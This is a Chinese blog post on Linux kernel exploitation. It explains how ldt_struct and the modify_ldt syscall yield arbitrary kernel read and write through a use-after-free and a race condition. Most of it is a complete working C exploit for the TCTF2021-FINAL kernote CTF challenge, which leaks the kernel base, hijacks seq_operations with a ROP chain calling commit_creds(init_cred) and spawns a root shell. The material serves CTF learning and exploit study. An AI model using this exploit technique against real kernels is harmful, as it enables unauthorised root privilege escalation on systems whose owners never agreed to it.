---
layout: post
title: "利用ldt_struct 与 modify_ldt 系统调用实现任意地址读写"
date: "2022-09-14T20:23:59.121Z"
---
利用ldt\_struct 与 modify\_ldt 系统调用实现任意地址读写
========================================

利用ldt\_struct 与 modify\_ldt 系统调用实现任意地址读写
========================================

### ldt\_struct与modify\_ldt系统调用的介绍

#### ldt\_struct

`ldt`是`局部段描述符表`，里面存放的是进程的段描述符，段寄存器里存放的段选择子便是段描述符表中段描述符的索引。和`ldt`有关的结构体是`ldt_struct`。

    struct ldt_struct {
        /*
         * Xen requires page-aligned LDTs with special permissions.  This is
         * needed to prevent us from installing evil descriptors such as
         * call gates.  On native, we could merge the ldt_struct and LDT
         * allocations, but it's not worth trying to optimize.
         */
        struct desc_struct    *entries;
        unsigned int        nr_entries;
    
        /*
         * If PTI is in use, then the entries array is not mapped while we're
         * in user mode.  The whole array will be aliased at the addressed
         * given by ldt_slot_va(slot).  We use two slots so that we can allocate
         * and map, and enable a new LDT without invalidating the mapping
         * of an older, still-in-use LDT.
         *
         * slot will be -1 if this LDT doesn't have an alias mapping.
         */
        int            slot;
    };
    

这个结构体的大小仅有`0x10`，前`8`字节存放的还是一个指针，如果能够控制它，那么便可以进行接下来的任意地址读写。前`8`字节的`entries`指针指向`desc_struct`结构体，即段描述符，定义如下：

    /* 8 byte segment descriptor */
    struct desc_struct {
        u16    limit0;
        u16    base0;
        u16    base1: 8, type: 4, s: 1, dpl: 2, p: 1;
        u16    limit1: 4, avl: 1, l: 1, d: 1, g: 1, base2: 8;
    } __attribute__((packed));
    

#### modify\_ldt系统调用

`modify_ldt`这个系统调用，是提供给我们用来获取或修改当前进程的`LDT`用的。我们看调用`modify_ldt`的几个用法，源码如下：

    SYSCALL_DEFINE3(modify_ldt, int , func , void __user * , ptr ,
            unsigned long , bytecount)
    {
        int ret = -ENOSYS;
    
        switch (func) {
        case 0:
            ret = read_ldt(ptr, bytecount);
            break;
        case 1:
            ret = write_ldt(ptr, bytecount, 1);
            break;
        case 2:
            ret = read_default_ldt(ptr, bytecount);
            break;
        case 0x11:
            ret = write_ldt(ptr, bytecount, 0);
            break;
        }
        /*
         * The SYSCALL_DEFINE() macros give us an 'unsigned long'
         * return type, but tht ABI for sys_modify_ldt() expects
         * 'int'.  This cast gives us an int-sized value in %rax
         * for the return code.  The 'unsigned' is necessary so
         * the compiler does not try to sign-extend the negative
         * return codes into the high half of the register when
         * taking the value from int->long.
         */
        return (unsigned int)ret;
    }
    

我们除了系统调用号外传入的三个参数是`func,ptr,bytecount`，其中`ptr`指针指向的是`user_desc`结构体。这个结构体如下：

    struct user_desc {
        unsigned int  entry_number;
        unsigned int  base_addr;
        unsigned int  limit;
        unsigned int  seg_32bit:1;
        unsigned int  contents:2;
        unsigned int  read_exec_only:1;
        unsigned int  limit_in_pages:1;
        unsigned int  seg_not_present:1;
        unsigned int  useable:1;
    };
    

### 任意地址读

利用的函数是`ldt_read`，其关键源码如下：

    static int read_ldt(void __user *ptr, unsigned long bytecount)
    {
    //...
        if (copy_to_user(ptr, mm->context.ldt->entries, entries_size)) {
            retval = -EFAULT;
            goto out_unlock;
        }
    //...
    out_unlock:
        up_read(&mm->context.ldt_usr_sem);
        return retval;
    }
    

这个函数直接调用copy\_to\_user(ptr, mm->context.ldt->entries, entries\_size)，向用户空间读取数据，如果我们可以控制`entries`，那么我们就可以实现任意地址读。

如何控制`entries`？我们看`write_ldt`的源码可以看到调用`alloc_ldt_struct`为新的`ldt_struct`开辟了空间。

    static int write_ldt(void __user *ptr, unsigned long bytecount, int oldmode)
    {
        //...
    
        old_ldt       = mm->context.ldt;
        old_nr_entries = old_ldt ? old_ldt->nr_entries : 0;
        new_nr_entries = max(ldt_info.entry_number + 1, old_nr_entries);
    
        error = -ENOMEM;
        new_ldt = alloc_ldt_struct(new_nr_entries);
        if (!new_ldt)
            goto out_unlock;
        //...
        return error;
    }
    

再看`alloc_ldt_struct`的源码，调用了`kamlloc`去分配新空间。

    static struct ldt_struct *alloc_ldt_struct(unsigned int num_entries)
    {
        struct ldt_struct *new_ldt;
        unsigned int alloc_size;
    
        if (num_entries > LDT_ENTRIES)
            return NULL;
    
        new_ldt = kmalloc(sizeof(struct ldt_struct), GFP_KERNEL);
    //...
    

我们就可以想到通过`UAF`去控制`ldt_struct`，修改`entries`即可读取想要的数据。

### 任意地址写

利用的函数是`write_ldt`，其关键源码如下：

    static int write_ldt(void __user *ptr, unsigned long bytecount, int oldmode)
    {
        //...
    
        old_ldt       = mm->context.ldt;
        old_nr_entries = old_ldt ? old_ldt->nr_entries : 0;
        new_nr_entries = max(ldt_info.entry_number + 1, old_nr_entries);
    
        error = -ENOMEM;
        new_ldt = alloc_ldt_struct(new_nr_entries);
        if (!new_ldt)
            goto out_unlock;
    
        if (old_ldt)
            memcpy(new_ldt->entries, old_ldt->entries, old_nr_entries * LDT_ENTRY_SIZE);
    
        new_ldt->entries[ldt_info.entry_number] = ldt;
    
        //...
    }
    

我们可以看到拷贝是`memcpy(new_ldt->entries, old_ldt->entries, old_nr_entries * LDT_ENTRY_SIZE)`，我们再看一下`LDT_ENTRY_SIZE`的定义

    /* Maximum number of LDT entries supported. */
    #define LDT_ENTRIES    8192
    /* The size of each LDT entry. */
    #define LDT_ENTRY_SIZE    8
    

可以看出拷贝的量非常大。并且在拷贝结束之后有`new_ldt->entries[ldt_info.entry_number] = ldt;`这样一行代码。那我们就可以通过条件竞争的方式去改变`new_ldt->entries`，从而实现任意地址写。

### 例题：TCTF2021-FINAL-kernote

exp

    #define _GNU_SOURCE
    #include <sys/types.h>
    #include <sys/ioctl.h>
    #include <sys/prctl.h>
    #include <sys/syscall.h>
    #include <sys/mman.h>
    #include <sys/wait.h>
    #include <asm/ldt.h>
    #include <stdio.h>
    #include <signal.h>
    #include <pthread.h>
    #include <unistd.h>
    #include <stdlib.h>
    #include <string.h>
    #include <fcntl.h>
    #include <ctype.h>
    
    
    int fd;
    size_t kernel_offset;
    size_t kernel_base;
    int seq_fd;
    int ret;
    size_t page_offset_base = 0xffff888000000000;
    size_t init_cred;
    size_t prepare_kernel_cred;
    size_t commit_creds;
    size_t pop_rdi_ret;
    size_t swapgs_restore_regs_and_return_to_usermode;
    
    void ErrExit(char* err_msg)
    {
    	puts(err_msg);
    	exit(-1);
    }
    
    void set(int index)
    {
        ioctl(fd, 0x6666, index);
    }
    
    void add(int index)
    {
        ioctl(fd, 0x6667, index);
    }
    
    void delete(int index)
    {
        ioctl(fd, 0x6668, index);
    }
    
    void edit(size_t data)
    {
        ioctl(fd, 0x6669, data);
    }
    
    int main()
    {
    	struct user_desc desc;
    	int pipe_fd[2] = {0};
    	size_t temp;
    	size_t *buf;
    	size_t search_addr;
    	
    	printf("\033[34m\033[1m[*] Start exploit\033[0m\n");
    
    	fd = open("/dev/kernote", O_RDWR);
    	if(fd<0)
    		ErrExit("[-] open kernote error");
    	/*
    	struct user_desc {
    	unsigned int  entry_number;
    	unsigned int  base_addr;
    	unsigned int  limit;
    	unsigned int  seg_32bit:1;
    	unsigned int  contents:2;
    	unsigned int  read_exec_only:1;
    	unsigned int  limit_in_pages:1;
    	unsigned int  seg_not_present:1;
    	unsigned int  useable:1;
    	};
    	*/
    
    	desc.entry_number = 0x8000 / 8;
    	desc.base_addr = 0xff0000;
    	desc.limit = 0;
    	desc.seg_32bit = 0;
    	desc.contents = 0;
    	desc.read_exec_only = 0;
    	desc.limit_in_pages = 0;
    	desc.seg_not_present = 0;
    	desc.useable = 0;
    	desc.lm = 0;
    
    	add(0);
    	set(0);
    	delete(0);
    	
    	syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));
    	while(1)
    	{
    		edit(page_offset_base);
    		ret = syscall(SYS_modify_ldt, 0, &temp, 8);
    		if(ret >= 0)
    			break;
    		page_offset_base+= 0x4000000;
    	}
    	printf("\033[32m\033[1m[+] Find page_offset_base=> \033[0m0x%lx\n", page_offset_base);
    	
    	pipe(pipe_fd);
    	buf = (size_t*) mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    	search_addr = page_offset_base;
    	while(1)
    	{
    		edit(search_addr);
    		ret = fork();
    		if(!ret)
    		{
    			syscall(SYS_modify_ldt, 0, buf, 0x8000);
    			for(int i=0; i<0x1000; i++)
    				if(buf[i]>0xffffffff81000000 && (buf[i] & 0xfff) == 0x40)
    				{
    					kernel_base = buf[i] - 0x40;
    					kernel_offset = kernel_base - 0xffffffff81000000;
    				}
    			
    			write(pipe_fd[1], &kernel_base, 8);
    			exit(0);
    		}
    		
    		wait(NULL);
    		read(pipe_fd[0], &kernel_base, 8);
    		if(kernel_base)
    			break;
    		search_addr+= 0x8000;
    	}
    
    	kernel_offset = kernel_base - 0xffffffff81000000;
    	printf("\033[32m\033[1m[+] Find kernel base=> \033[0m0x%lx\n", kernel_base);
    	printf("\033[32m\033[1m[+] Kernel offset=> \033[0m0x%lx\n", kernel_offset);
    
    	add(1);
    	set(1);
    	delete(1);
    	
    	seq_fd = open("/proc/self/stat", O_RDONLY);
    	if(seq_fd<0)
    		ErrExit("[-] open seq error");
    	
    	edit(0xffffffff817c21a6 + kernel_offset);
    
    	init_cred = 0xffffffff8266b780 + kernel_offset;
    	prepare_kernel_cred = 0xffffffff810ca2b0 + kernel_offset;
    	commit_creds = 0xffffffff810c9dd0 + kernel_offset;
    	pop_rdi_ret = 0xffffffff81075c4c + kernel_offset;
    	swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00fb0 + 10 + kernel_offset;
    
    	__asm__(
    	"mov r15,   0xbeefdead;"
    	"mov r14,   0x11111111;"
    	"mov r13,   pop_rdi_ret;" // start at there
    	"mov r12,   init_cred;"
    	"mov rbp,   commit_creds;"
    	"mov rbx,   swapgs_restore_regs_and_return_to_usermode;"
    	"mov r11,   0x66666666;"
    	"mov r10,   0x77777777;"
    	"mov r9,    0x88888888;"
    	"mov r8,    0x99999999;"
    	"xor rax,   rax;"
    	"mov rcx,   0xaaaaaaaa;"
    	"mov rdx,   8;"
    	"mov rsi,   rsp;"
    	"mov rdi,   seq_fd;"
    	"syscall"
    	);
    
    	system("/bin/sh");
    	return 0;
    }
    
    

本文来自博客园，作者：{狒猩橙}，转载请注明原文链接：[https://www.cnblogs.com/pwnfeifei/p/16692658.html](https://www.cnblogs.com/pwnfeifei/p/16692658.html)